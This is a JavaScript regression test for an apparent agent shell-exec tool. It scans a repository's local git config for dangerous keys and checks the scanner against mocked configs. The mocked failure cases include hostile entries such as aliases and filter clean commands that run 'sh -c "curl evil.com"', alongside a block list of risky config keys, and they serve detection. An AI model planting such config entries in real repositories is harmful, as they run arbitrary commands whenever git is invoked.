/**
 * Slice 3d — repo-local .git/config dangerous-key regression test
 *
 * Round-2 Blocker 1 + Round-3 Blockers 1 (include) + 2 (filter clean/
 * smudge). Reads the live local .git/config and asserts none of the
 * dangerous keys defined in design §4 are present. Plus a battery of
 * test-of-the-test cases over mocked config strings.
 *
 * If this test fails against the live config, an operator has either
 * legitimately added a config entry (in which case add a documented
 * exception below with a review trail) or a malicious config has been
 * landed (in which case escalate to Tyson).
 *
 * The failure message specifically names `credential.helper` as a
 * documented exception class so an operator who legitimately needs a
 * credential helper knows where to add the exception (round-4 LOW L4.2).
 */

import { execFileSync } from 'node:child_process';
import path from 'node:path';
import {
  DANGEROUS_GIT_CONFIG_LEAVES,
  DANGEROUS_GIT_CONFIG_EXACT_KEYS,
  DANGEROUS_GIT_CONFIG_SECTIONS,
  DANGEROUS_GIT_CONFIG_ALIAS_NAMES,
} from '../src/tools/shell-exec-verb-schemas.js';

let passed = 0;
let failed = 0;
function check(name, cond, detail = null) {
  if (cond) { passed++; console.log(`  ✓ ${name}`); }
  else {
    failed++;
    console.log(`  ✗ ${name}`);
    if (detail !== null) console.log(`      ${String(detail).slice(0, 400)}`);
  }
}

const EXCEPTION_HINT = (
  'Documented exception classes:\n' +
  '  - `credential.helper` — if a legitimate credential helper is needed, add\n' +
  '    a documented exception in tests/shell-exec-git-config-safety.test.js\n' +
  '    with a review-trail comment. See design Appendix A — credential.helper\n' +
  '    is intentionally caught by the `helper` leaf catcher.\n' +
  '  - `core.sshCommand` — currently excluded (not in v1 verb surface).\n' +
  '  - `pager.*` — currently excluded (neutralised by SAFE_ENV.GIT_PAGER).\n' +
  '  - `core.hooksPath` — currently excluded (status/log do not fire hooks).'
);

function formatFailure(section, key, value) {
  const safeValue = String(value).slice(0, 80);
  return (
    `shell_exec git-config safety: dangerous key detected.\n` +
    `  Section: [${section}]\n` +
    `  Key:     ${key}\n` +
    `  Value:   ${safeValue}\n` +
    `Refusing to merge.\n${EXCEPTION_HINT}`
  );
}

// ---------- Parser: flat key list ----------

/**
 * scanFlatKeys(flatLines) — flatLines is an array of "section.subsec.leaf=value"
 * strings (the format of `git config --list --local`). Returns
 * { ok: true } or { ok: false, message }.
 */
export function scanFlatKeys(flatLines) {
  for (const line of flatLines) {
    if (!line || line.length === 0) continue;
    const eq = line.indexOf('=');
    const key = eq === -1 ? line : line.slice(0, eq);
    const value = eq === -1 ? '' : line.slice(eq + 1);
    const parts = key.split('.');
    const section = parts[0];
    const leaf = parts[parts.length - 1];

    // Catcher 3 — section prefix (include, includeIf)
    if (DANGEROUS_GIT_CONFIG_SECTIONS.includes(section)) {
      return { ok: false, message: formatFailure(section, key, value) };
    }
    // Catcher 1 — exact flat key
    if (DANGEROUS_GIT_CONFIG_EXACT_KEYS.includes(key)) {
      return { ok: false, message: formatFailure(section, key, value) };
    }
    // Catcher 2 — leaf name (command/program/driver/textconv/helper/execute/clean/smudge)
    if (DANGEROUS_GIT_CONFIG_LEAVES.includes(leaf)) {
      return { ok: false, message: formatFailure(section, key, value) };
    }
    // Catcher 4 — alias-specific rules
    if (section === 'alias') {
      const aliasName = parts.slice(1).join('.');
      if (DANGEROUS_GIT_CONFIG_ALIAS_NAMES.includes(aliasName)) {
        return { ok: false, message: formatFailure(section, key, value) };
      }
      if (value.startsWith('!')) {
        return { ok: false, message: formatFailure(section, key, value) };
      }
    }
  }
  return { ok: true };
}

// ---------- Tests against the LIVE local .git/config ----------

console.log('\n=== A. Live repo .git/config scan ===');
let liveLines = [];
let liveScanRan = false;
try {
  const repoRoot = path.resolve(new URL('..', import.meta.url).pathname);
  const raw = execFileSync('git', ['config', '--list', '--local'], {
    cwd: repoRoot,
    encoding: 'utf8',
  });
  liveLines = raw.split(/\r?\n/).filter(l => l.length > 0);
  liveScanRan = true;
  const result = scanFlatKeys(liveLines);
  if (!result.ok) {
    console.log('  ✗ LIVE config contains a dangerous key:');
    console.log(result.message);
    check('live .git/config is clean', false, result.message);
  } else {
    check('live .git/config is clean (no dangerous keys)', true);
    console.log(`  [info] scanned ${liveLines.length} keys`);
  }
} catch (err) {
  console.log(`  [warn] could not scan live config: ${err.message}`);
  check('live config scan ran', false, err.message);
}

// ---------- Tests against MOCKED configs (test-of-the-test) ----------

function shouldFail(label, mockLines, expectedHint) {
  const r = scanFlatKeys(mockLines);
  const failed = !r.ok && (!expectedHint || r.message.includes(expectedHint));
  check(`${label} — expected fail (${expectedHint || 'any'})`, failed, r);
}
function shouldPass(label, mockLines) {
  const r = scanFlatKeys(mockLines);
  check(`${label} — expected pass`, r.ok, r);
}

console.log('\n=== B. Mocked configs that MUST FAIL ===');
shouldFail('alias.status = git log', ['alias.status=git log'], 'alias');
shouldFail('alias.log = anything', ['alias.log=anything'], 'alias');
shouldFail('alias.foo = !sh -c …', ['alias.foo=!sh -c "curl evil.com"'], 'alias');
shouldFail('core.fsmonitor', ['core.fsmonitor=/tmp/evil'], 'fsmonitor');
shouldFail('diff "*.json" textconv', ['diff.*.json.textconv=/tmp/conv'], 'textconv');
shouldFail('merge "ours" driver', ['merge.ours.driver=/tmp/drv'], 'driver');
shouldFail('gpg.program', ['gpg.program=/usr/bin/gpg'], 'program');
shouldFail('gpg.openpgp.program', ['gpg.openpgp.program=/usr/bin/gpg'], 'program');
shouldFail('include.path (round-3 Blocker 1)', ['include.path=/tmp/evil.config'], 'include');
shouldFail('includeIf.gitdir … .path', ['includeIf.gitdir:/root/QClaw/.path=/tmp/c.config'], 'includeIf');
shouldFail('includeIf onbranch path', ['includeIf.onbranch:main.path=/tmp/c.config'], 'includeIf');
shouldFail('filter.evilfilter.clean (round-3 Blocker 2)', ['filter.evilfilter.clean=!sh -c "curl evil.com"'], 'clean');
shouldFail('filter.evilfilter.smudge (round-3 Blocker 2)', ['filter.evilfilter.smudge=!sh -c "x"'], 'smudge');
shouldFail('credential.helper (caught by helper leaf)', ['credential.helper=store'], 'helper');

console.log('\n=== C. Mocked configs that MUST PASS ===');
shouldPass('empty config', []);
shouldPass('only benign keys', [
  'remote.origin.url=https://github.com/QuantumClaw/QClaw.git',
  'branch.main.remote=origin',
  'user.email=info@flowos.tech',
  'core.repositoryformatversion=0',
]);
shouldPass('core.sshCommand (documented exclusion)', ['core.sshCommand=/usr/bin/ssh']);
shouldPass('pager.log (documented exclusion)', ['pager.log=less']);
shouldPass('core.hooksPath (documented exclusion)', ['core.hooksPath=/tmp/hooks']);
shouldPass('filter.x.required (benign-alone)', ['filter.x.required=true']);

console.log('\n=== D. Failure message names credential.helper as exception class (LOW L4.2) ===');
{
  const r = scanFlatKeys(['credential.helper=store']);
  check(
    'failure message mentions credential.helper exception class',
    !r.ok && r.message.includes('credential.helper'),
    r,
  );
}

console.log(`\n=== shell-exec-git-config-safety.test.js: ${passed} passed, ${failed} failed ===\n`);
if (failed > 0) process.exit(1);
